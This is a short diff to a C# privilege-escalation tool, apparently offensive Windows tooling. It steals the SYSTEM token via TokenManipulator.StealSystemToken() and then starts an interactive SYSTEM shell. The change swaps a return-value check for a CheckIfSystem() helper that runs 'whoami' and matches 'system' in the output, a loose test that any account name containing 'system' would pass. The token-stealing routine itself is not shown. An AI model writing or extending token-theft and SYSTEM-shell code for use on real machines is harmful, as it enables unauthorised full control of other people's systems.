@@ -10,7 +10,12 @@ namespace KernelMode.Privilege
             Console.WriteLine("[*] Attempting to start an interactive SYSTEM shell...");
 
             // First, ensure we have SYSTEM privileges.
-            if (!TokenManipulator.StealSystemToken())
+            Console.WriteLine("[*] Elevating privileges to SYSTEM...");
+            TokenManipulator.StealSystemToken();
+            
+            // Check if we're SYSTEM by examining process token
+            bool isSystem = CheckIfSystem();
+            if (!isSystem)
             {
                 Console.WriteLine("[-] Failed to elevate to SYSTEM. Cannot start shell.");
                 return;
@@ -72,6 +77,31 @@ namespace KernelMode.Privilege
             }
 
             Console.WriteLine("[*] Exited SYSTEM shell.");
+        }
+        
+        private static bool CheckIfSystem()
+        {
+            try
+            {
+                // A simple check to see if we're running as SYSTEM
+                using (var process = Process.Start(new ProcessStartInfo
+                {
+                    FileName = "whoami",
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    CreateNoWindow = true
+                }))
+                {
+                    string output = process.StandardOutput.ReadToEnd().Trim().ToLower();
+                    process.WaitForExit();
+                    return output.Contains("system") || output.Contains("nt authority\\system");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[-] Error checking privileges: {ex.Message}");
+                return false;
+            }
         }
     }
 }
